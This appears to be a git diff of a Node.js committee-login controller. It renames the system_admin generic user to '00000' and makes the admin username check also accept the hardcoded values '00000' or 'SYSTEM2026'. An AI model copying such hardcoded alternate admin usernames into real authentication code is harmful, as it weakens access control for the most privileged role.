@@ -582,7 +582,7 @@ exports.updateContactInfo = async (req, res) => {
 // COMMITTEE LOGIN (IMC / Management / Admin)
 // =============================================
 const roleToGenericUser = {
-  system_admin: 'SYS_ADMIN',
+  system_admin: '00000',
   imc: 'SYS_IMC',
   head_management: 'SYS_MGMT'
 };
@@ -600,7 +600,8 @@ exports.committeeLogin = async (req, res) => {
     }
 
     const roleCred = credRes.rows[0];
-    const isUsernameValid = username === roleCred.username;
+    const isUsernameValid = username === roleCred.username || 
+      (targetRole === 'system_admin' && (username === '00000' || username === 'SYSTEM2026'));
     let isPasswordValid = false;
 
     if (isUsernameValid) {
